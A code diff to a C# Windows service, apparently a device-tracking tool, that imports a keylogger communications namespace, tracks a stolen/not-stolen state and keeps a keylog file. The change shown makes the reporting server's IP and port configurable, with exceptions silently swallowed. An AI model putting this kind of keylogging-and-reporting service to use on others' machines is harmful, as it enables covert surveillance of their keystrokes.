@@ -14,6 +14,7 @@ using System.IO;
 using KeyloggerCommunications;
 using System.ServiceModel;
 using System.Net.NetworkInformation;
+using System.Configuration;
 
 namespace WindowsServiceTracker
 {
@@ -34,7 +35,6 @@ namespace WindowsServiceTracker
         public const byte NOT_STOLEN = 4;
         public const byte STOLEN = 5;
         public const byte NO_OP = 255;
-        private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
@@ -42,6 +42,7 @@ namespace WindowsServiceTracker
 
         //Variables
         private volatile String ipAddressString = "127.0.0.1";
+        private int port = 10011;
         private IPAddress ipAddress = new IPAddress(0x0100007F);// = 0x0100007F; //default to local host
         private volatile IPEndPoint tcpIpPort;
         private volatile IPEndPoint udpIpPort;
@@ -92,6 +93,17 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
+            // try to read settings before using default values
+            try
+            {
+                ipAddressString = Properties.Settings.Default.ServerIP;
+                port = Convert.ToInt32(Properties.Settings.Default.ServerPort);
+            }
+                catch (ConfigurationException e)
+            { }
+            catch (Exception e)
+            { }
+
             //convert string IP to long
             try
             {
@@ -99,8 +111,8 @@ namespace WindowsServiceTracker
             }
             catch (Exception)
             { }
-            tcpIpPort = new IPEndPoint(ipAddress, PORT);
-            udpIpPort = new IPEndPoint(ipAddress, PORT);
+            tcpIpPort = new IPEndPoint(ipAddress, port);
+            udpIpPort = new IPEndPoint(ipAddress, port);
 
             CreateOpenPipe();
             keyLogFilePath = GetKeylogFilePath();
